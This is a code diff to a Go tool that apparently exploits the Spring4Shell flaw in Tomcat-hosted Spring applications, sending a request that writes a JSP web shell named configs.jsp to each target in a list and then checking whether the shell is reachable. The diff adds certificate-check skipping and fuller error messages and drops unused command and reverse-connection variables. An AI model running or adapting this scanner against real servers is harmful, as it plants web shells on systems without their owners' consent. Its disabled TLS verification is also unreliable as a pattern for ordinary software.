@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"crypto/tls"
 	"flag"
 	"fmt"
 	"net/http"
@@ -22,7 +23,7 @@ func verify(target interface{}) {
 	t := target.(string)
 	exp = strings.Replace(exp, "tomcatwar", "configs", -1)
 
-	client1 := resty.New()
+	client1 := resty.New().SetTimeout(10 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
 	client1.SetTimeout(15 * time.Second)
 	_, err := client1.R().
 		SetHeader("suffix", "%>//").
@@ -35,16 +36,17 @@ func verify(target interface{}) {
 		Post(t)
 
 	if err != nil {
-		fmt.Println("Request error: " + t)
+		fmt.Println("Request error: " + t + "----" + err.Error())
+
 	} else {
-		client2 := resty.New()
+		client2 := resty.New().SetTimeout(10 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
 		client2.SetTimeout(15 * time.Second)
 		resp2, err := client2.R().
 			SetHeader("Content-Type", "application/x-www-form-urlencoded").
 			SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
 			Post(t + "/configs.jsp")
 		if err != nil {
-			fmt.Println("Request error: " + t)
+			fmt.Println("Request error: " + t + "----" + err.Error())
 		} else {
 			if resp2.StatusCode() == http.StatusOK {
 				finalresult = append(finalresult, t)
@@ -55,7 +57,7 @@ func verify(target interface{}) {
 }
 
 func main() {
-	var targetURL, runCommand, filepath, ip, port string
+	var targetURL, filepath string
 	var thread int
 	targets := []string{}
 
@@ -70,7 +72,6 @@ func main() {
 	flag.Parse()
 
 	if len(targetURL) == 0 {
-		fmt.Println("runcommand: ", runCommand, " ip: ", ip, " port: ", port)
 		file, err := os.OpenFile(filepath, os.O_RDWR, 0666)
 		if err != nil {
 			fmt.Println("Open file error!", err)
